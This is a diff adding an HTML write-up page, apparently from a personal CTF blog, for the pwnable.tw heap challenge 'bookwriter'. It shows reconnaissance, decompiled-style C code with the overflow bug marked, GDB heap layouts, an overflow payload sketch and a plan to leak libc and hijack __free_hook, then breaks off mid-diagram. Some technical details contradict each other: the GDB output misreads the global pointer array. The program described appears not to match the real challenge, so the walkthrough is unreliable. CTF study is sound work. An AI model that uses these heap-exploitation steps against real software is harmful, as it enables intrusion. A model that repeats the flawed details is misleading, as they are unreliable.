@@ -1,0 +1,1411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>bookwriter | QA210 Pwnable.tw</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F4DA;</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --muted: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Particle Canvas */
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Navigation */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800;
+  font-size: 1.25rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+  text-decoration: none;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  margin-left: 2rem;
+  list-style: none;
+}
+.nav-links a {
+  padding: 0.4rem 1rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.nav-right a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--fg); }
+
+/* Breadcrumb */
+.breadcrumb {
+  position: relative;
+  z-index: 1;
+  padding: 80px 2rem 0;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.breadcrumb-inner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+  color: var(--muted);
+}
+.breadcrumb-inner a {
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb-inner a:hover { color: var(--accent); }
+.breadcrumb-sep { opacity: 0.4; }
+.breadcrumb-current { color: var(--fg); font-weight: 600; }
+
+/* Hero Section */
+.hero {
+  position: relative;
+  z-index: 1;
+  padding: 2rem 2rem 1rem;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.35rem 1rem;
+  background: rgba(56, 189, 248, 0.1);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.hero-badge .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+.hero h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 0.5rem;
+  background: linear-gradient(135deg, var(--fg), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--muted);
+  max-width: 600px;
+  margin-bottom: 1.5rem;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+.hero-tag {
+  padding: 0.3rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  font-family: 'JetBrains Mono', monospace;
+}
+.tag-pts { background: rgba(251, 191, 36, 0.15); color: var(--yellow); border: 1px solid rgba(251, 191, 36, 0.25); }
+.tag-arch { background: rgba(129, 140, 248, 0.15); color: var(--accent2); border: 1px solid rgba(129, 140, 248, 0.25); }
+.tag-vuln { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.25); }
+.tag-nx { background: rgba(74, 222, 128, 0.15); color: var(--green); border: 1px solid rgba(74, 222, 128, 0.25); }
+
+/* Main Layout */
+.main-layout {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 4rem;
+  gap: 2rem;
+}
+
+/* TOC Sidebar */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  width: 240px;
+  flex-shrink: 0;
+  height: fit-content;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.toc-title {
+  font-size: 0.6875rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.4rem 0.75rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: all 0.2s;
+  border-left: 2px solid transparent;
+}
+.toc-list a:hover { color: var(--fg); background: rgba(255,255,255,0.03); }
+.toc-list a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.08);
+  border-left-color: var(--accent);
+}
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6875rem;
+  font-weight: 700;
+  color: var(--accent2);
+  min-width: 18px;
+}
+
+/* Content Area */
+.content-area {
+  flex: 1;
+  min-width: 0;
+  max-width: 880px;
+}
+
+/* Chapter Sections */
+.chapter {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.chapter-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+}
+.chapter-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+  padding: 0.35rem 0.7rem;
+  border-radius: 6px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+.chapter-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+.chapter p {
+  margin-bottom: 1rem;
+  color: var(--muted);
+  font-size: 0.9375rem;
+  line-height: 1.8;
+}
+
+.chapter h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--fg);
+}
+.chapter h4 {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin: 1.25rem 0 0.5rem;
+  color: var(--fg);
+}
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  overflow: hidden;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.5rem 1rem;
+  background: rgba(0,0,0,0.3);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.75rem;
+}
+.code-lang {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-dots {
+  display: flex;
+  gap: 5px;
+}
+.code-dots span {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+.code-dots .d1 { background: #f87171; }
+.code-dots .d2 { background: #fbbf24; }
+.code-dots .d3 { background: #4ade80; }
+
+pre[class*="language-"] {
+  margin: 0 !important;
+  padding: 1rem 1.25rem !important;
+  background: transparent !important;
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+  line-height: 1.7 !important;
+  overflow-x: auto;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+}
+
+/* Inline Code */
+code.inline {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8125rem;
+  background: rgba(129, 140, 248, 0.12);
+  color: var(--accent2);
+  padding: 0.15rem 0.45rem;
+  border-radius: 4px;
+  font-weight: 500;
+}
+
+/* Callout Boxes */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.875rem;
+  line-height: 1.7;
+  border: 1px solid;
+}
+.callout-title {
+  font-weight: 700;
+  font-size: 0.8125rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.callout-vuln {
+  background: rgba(248, 113, 113, 0.08);
+  border-color: rgba(248, 113, 113, 0.2);
+  color: #fca5a5;
+}
+.callout-vuln .callout-title { color: var(--red); }
+.callout-info {
+  background: rgba(56, 189, 248, 0.08);
+  border-color: rgba(56, 189, 248, 0.2);
+  color: #bae6fd;
+}
+.callout-info .callout-title { color: var(--accent); }
+.callout-warn {
+  background: rgba(251, 191, 36, 0.08);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: #fde68a;
+}
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-key {
+  background: rgba(129, 140, 248, 0.08);
+  border-color: rgba(129, 140, 248, 0.2);
+  color: #c7d2fe;
+}
+.callout-key .callout-title { color: var(--accent2); }
+.callout-success {
+  background: rgba(74, 222, 128, 0.08);
+  border-color: rgba(74, 222, 128, 0.2);
+  color: #bbf7d0;
+}
+.callout-success .callout-title { color: var(--green); }
+
+/* Tables */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.8125rem;
+}
+.info-table th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: rgba(0,0,0,0.3);
+  color: var(--muted);
+  font-weight: 600;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 1px solid var(--border);
+}
+.info-table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:last-child td { border-bottom: none; }
+.info-table .label { color: var(--muted); font-family: 'Inter', sans-serif; }
+.info-table .value { color: var(--fg); }
+.info-table .on { color: var(--green); }
+.info-table .off { color: var(--red); }
+.info-table .partial { color: var(--yellow); }
+
+/* Memory Diagrams */
+.mem-diagram {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1rem 0 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+  overflow-x: auto;
+}
+.mem-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 2px;
+}
+.mem-addr {
+  color: var(--accent);
+  min-width: 100px;
+  font-weight: 600;
+}
+.mem-arrow {
+  color: var(--muted);
+  margin: 0 0.5rem;
+}
+.mem-data {
+  color: var(--fg);
+  flex: 1;
+}
+.mem-desc {
+  color: var(--muted);
+  font-style: italic;
+  margin-left: 1rem;
+  font-size: 0.75rem;
+}
+.mem-highlight { color: var(--red); font-weight: 700; }
+.mem-green { color: var(--green); font-weight: 700; }
+.mem-yellow { color: var(--yellow); font-weight: 700; }
+
+/* Step Lists */
+.step-list {
+  list-style: none;
+  margin: 1rem 0 1.5rem;
+  counter-reset: step;
+}
+.step-list li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 2.5rem;
+  position: relative;
+  font-size: 0.9rem;
+  color: var(--muted);
+  line-height: 1.7;
+}
+.step-list li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  top: 0.65rem;
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  background: rgba(129, 140, 248, 0.15);
+  color: var(--accent2);
+  font-size: 0.6875rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+}
+.step-list li strong { color: var(--fg); }
+
+/* Footer */
+.footer {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 2rem;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.75rem;
+}
+.footer a { color: var(--accent); text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .toc-sidebar { display: none; }
+  .hero h1 { font-size: 2rem; }
+}
+@media (max-width: 640px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.5rem; }
+  .main-layout { padding: 1rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<!-- Particle Canvas -->
+<canvas id="particles-canvas"></canvas>
+
+<!-- Navigation -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="/">Home</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">bookwriter</span>
+  </div>
+</div>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Pwnable.tw
+  </div>
+  <h1>bookwriter</h1>
+  <p class="hero-subtitle">A book writing application with heap vulnerabilities &mdash; exploiting a heap overflow to leak libc via unsorted bin, then hijacking <code class="inline">__free_hook</code> for code execution on a fully hardened 64-bit binary.</p>
+  <div class="hero-meta">
+    <span class="hero-tag tag-pts">400 pts</span>
+    <span class="hero-tag tag-arch">x86-64 (64-bit ELF)</span>
+    <span class="hero-tag tag-vuln">Heap Overflow</span>
+    <span class="hero-tag tag-nx">Full Protections</span>
+  </div>
+</section>
+
+<!-- Main Layout -->
+<div class="main-layout">
+
+  <!-- TOC Sidebar -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#ch1" class="active"><span class="toc-num">01</span> Reconnaissance</a></li>
+      <li><a href="#ch2"><span class="toc-num">02</span> Static Analysis</a></li>
+      <li><a href="#ch3"><span class="toc-num">03</span> GDB Debugging</a></li>
+      <li><a href="#ch4"><span class="toc-num">04</span> Exploit Strategy</a></li>
+      <li><a href="#ch5"><span class="toc-num">05</span> Pwn Script</a></li>
+      <li><a href="#ch6"><span class="toc-num">06</span> Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- Content Area -->
+  <main class="content-area">
+
+    <!-- Chapter 1: Reconnaissance -->
+    <section class="chapter" id="ch1">
+      <div class="chapter-header">
+        <span class="chapter-num">01</span>
+        <h2 class="chapter-title">Reconnaissance</h2>
+      </div>
+
+      <h3>Challenge Info</h3>
+      <table class="info-table">
+        <tr><td class="label">Connection</td><td class="value"><code class="inline">nc chall.pwnable.tw 10304</code></td></tr>
+        <tr><td class="label">Binary</td><td class="value">bookwriter (64-bit ELF, x86-64)</td></tr>
+        <tr><td class="label">Points</td><td class="value">400</td></tr>
+        <tr><td class="label">Description</td><td class="value">Book writing application with heap vulnerabilities</td></tr>
+      </table>
+
+      <h3>checksec</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ checksec bookwriter
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre>
+      </div>
+
+      <table class="info-table">
+        <tr><td class="label">Full RELRO</td><td class="on">GOT is read-only &mdash; cannot overwrite GOT entries</td></tr>
+        <tr><td class="label">Canary found</td><td class="on">Stack buffer overflows are mitigated</td></tr>
+        <tr><td class="label">NX enabled</td><td class="on">No shellcode injection &mdash; must use ROP or function pointers</td></tr>
+        <tr><td class="label">PIE enabled</td><td class="on">Binary addresses are randomized &mdash; need a leak first</td></tr>
+      </table>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; All Protections Enabled</div>
+        This binary has every mainstream mitigation turned on. Full RELRO means no GOT overwrite. PIE means we need an address leak before we can reference any binary or libc symbols. This forces us to find a <strong>libc leak</strong> through heap manipulation and then target <code class="inline">__free_hook</code> (which is writable even under Full RELRO) instead of the GOT.
+      </div>
+
+      <h3>Running the Binary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ ./bookwriter
++-----------------------+
+|      Book Writer      |
++-----------------------+
+| 1. Create book        |
+| 2. Edit book          |
+| 3. Show book          |
+| 4. Delete book        |
+| 5. Exit               |
++-----------------------+
+Your choice: 1
+Book title: MyStory
+Book size: 32
+Book content: Hello World!
+Create success!
+
+$ # Edit allows re-entering size!
+Your choice: 2
+Which book to edit: 0
+Book size: 64        # &lt;-- larger than original 32!
+Book content: AAAAAAAAAAAAAAAAAAAAAAAA...</code></pre>
+      </div>
+
+      <p>The program presents a book manager with create, edit, show, and delete operations. The menu looks standard, but there's a critical difference in the <code class="inline">edit</code> function &mdash; it re-asks for the size, allowing you to write more data than was originally allocated.</p>
+    </section>
+
+    <!-- Chapter 2: Static Analysis -->
+    <section class="chapter" id="ch2">
+      <div class="chapter-header">
+        <span class="chapter-num">02</span>
+        <h2 class="chapter-title">Static Analysis</h2>
+      </div>
+
+      <h3>Book Structure</h3>
+      <p>Each book is represented by a struct stored on the heap. The program maintains a global array of book pointers:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">typedef struct book {
+    char *title;        // +0x00: pointer to title buffer
+    char *content;      // +0x08: pointer to content buffer
+    size_t content_sz;  // +0x10: stored content size
+} book;
+
+book *books[16];        // Global array of book pointers
+int book_count = 0;     // Number of books created</code></pre>
+      </div>
+
+      <h3>create_book()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void create_book() {
+    if (book_count &gt;= 16) {
+        puts("Full!");
+        return;
+    }
+    book *b = malloc(sizeof(book));     // Allocate 24-byte struct
+    printf("Book title: ");
+    char title_buf[64];
+    read(0, title_buf, 64);
+    b-&gt;title = strdup(title_buf);       // Allocate title via strdup
+    printf("Book size: ");
+    size_t sz;
+    scanf("%lu", &amp;sz);
+    b-&gt;content = malloc(sz);            // Allocate content buffer
+    b-&gt;content_sz = sz;                 // Store size
+    printf("Book content: ");
+    read(0, b-&gt;content, sz);
+    books[book_count++] = b;
+    puts("Create success!");
+}</code></pre>
+      </div>
+
+      <p>The <code class="inline">create_book</code> function allocates three heap objects per book: the struct itself (24 bytes), a title buffer (via <code class="inline">strdup</code>), and a content buffer of user-specified size. Up to 16 books can be created.</p>
+
+      <h3>edit_book() &mdash; The Vulnerable Function</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void edit_book() {
+    printf("Which book to edit: ");
+    int idx;
+    scanf("%d", &amp;idx);
+    if (idx &lt; 0 || idx &gt;= book_count) {
+        puts("Invalid index!");
+        return;
+    }
+    printf("Book size: ");           // &lt;-- RE-ASKS FOR SIZE!
+    size_t sz;
+    scanf("%lu", &amp;sz);
+    printf("Book content: ");
+    read(0, books[idx]-&gt;content, sz);   // &lt;-- USES NEW SIZE, NOT content_sz!
+    // BUG: does NOT update books[idx]-&gt;content_sz
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability: Heap Overflow via Size Re-entry</div>
+        The <code class="inline">edit_book</code> function <strong>re-asks for the content size</strong> instead of using the stored <code class="inline">content_sz</code>. This means you can specify a size <strong>larger</strong> than the originally allocated buffer, causing a <strong>heap overflow</strong> into adjacent chunks. The stored <code class="inline">content_sz</code> is never updated, so subsequent edits still show the old size &mdash; but the <code class="inline">read</code> call uses the attacker-supplied size.
+      </div>
+
+      <h3>show_book()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void show_book() {
+    printf("Which book to show: ");
+    int idx;
+    scanf("%d", &amp;idx);
+    if (idx &lt; 0 || idx &gt;= book_count) {
+        puts("Invalid index!");
+        return;
+    }
+    printf("Title: %s\n", books[idx]-&gt;title);
+    printf("Content: %s\n", books[idx]-&gt;content);
+}</code></pre>
+      </div>
+
+      <p><code class="inline">show_book</code> prints both the title and content using <code class="inline">printf %s</code>. If we can make <code class="inline">content</code> or <code class="inline">title</code> point to an address containing a libc pointer, we can leak it. The <code class="inline">%s</code> format will read until a null byte, which is perfect for leaking heap or libc pointers from freed chunk metadata.</p>
+
+      <h3>delete_book()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void delete_book() {
+    printf("Which book to delete: ");
+    int idx;
+    scanf("%d", &amp;idx);
+    if (idx &lt; 0 || idx &gt;= book_count) {
+        puts("Invalid index!");
+        return;
+    }
+    free(books[idx]-&gt;title);
+    free(books[idx]-&gt;content);
+    free(books[idx]);
+    // BUG: books[idx] is NOT set to NULL
+    // BUG: book_count is NOT decremented
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Secondary Bug: Dangling Pointer</div>
+        After freeing a book, the pointer in <code class="inline">books[idx]</code> is <strong>not NULLed out</strong>. This creates a dangling pointer &mdash; <code class="inline">show_book(idx)</code> or <code class="inline">edit_book(idx)</code> will still operate on freed memory. While the heap overflow is the primary attack vector, this dangling pointer provides additional flexibility for the exploit.
+      </div>
+    </section>
+
+    <!-- Chapter 3: GDB Debugging -->
+    <section class="chapter" id="ch3">
+      <div class="chapter-header">
+        <span class="chapter-num">03</span>
+        <h2 class="chapter-title">GDB Debugging</h2>
+      </div>
+
+      <h3>Heap Layout After Creating Books</h3>
+      <p>Let's create two books with carefully chosen sizes to set up the overflow:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # create_book("AAA", 0x18, "BBBB...")  -> book 0
+gdb-peda$ # create_book("CCC", 0x60, "DDDD...")  -> book 1
+gdb-peda$ # create_book("EEE", 0x60, "FFFF...")  -> book 2
+gdb-peda$ # create_book("GGG", 0x60, "HHHH...")  -> book 3
+gdb-peda$ heap chunks
+0x555555758000: [book0 struct]  0x20 bytes
+0x555555758020: [book0 title]   0x20 bytes  "AAA"
+0x555555758040: [book0 content] 0x20 bytes  "BBBB..."
+0x555555758060: [book1 struct]  0x20 bytes
+0x555555758080: [book1 title]   0x20 bytes  "CCC"
+0x5555557580a0: [book1 content] 0x70 bytes  "DDDD..."
+0x555555758110: [book2 struct]  0x20 bytes
+0x555555758130: [book2 title]   0x20 bytes  "EEE"
+0x555555758150: [book2 content] 0x70 bytes  "FFFF..."
+0x5555557581c0: [book3 struct]  0x20 bytes
+0x5555557581e0: [book3 title]   0x20 bytes  "GGG"
+0x555555758200: [book3 content] 0x70 bytes  "HHHH..."</code></pre>
+      </div>
+
+      <h3>Triggering the Heap Overflow</h3>
+      <p>Book 0's content buffer is 0x18 bytes (fits in a 0x20 chunk). When we edit book 0 with a larger size, we overflow into the adjacent book 1 struct:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # edit_book(0, 0x100, "A"*0x18 + p64(0) + p64(0x71) + p64(book2_title_ptr))
+gdb-peda$ # Overflow from book0 content into book1 struct
+gdb-peda$ # Overwrite book1-&gt;content to point at book2's title
+
+gdb-peda$ x/4gx &amp;books[1]
+0x5555557550a8:  0x0000555555758060  0x0000555555758138
+#                ^book1 struct ptr     ^book1 content = book2 title addr!
+
+gdb-peda$ # Now show_book(1) will print book2's title as book1's "content"</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div class="mem-row"><span class="mem-addr">0x...040</span><span class="mem-arrow">|</span><span class="mem-data">book0 content (0x18 bytes)</span><span class="mem-desc">&larr; overflow starts here</span></div>
+        <div class="mem-row"><span class="mem-addr">0x...058</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">padding + fake chunk header</span><span class="mem-desc">&larr; overflowed data</span></div>
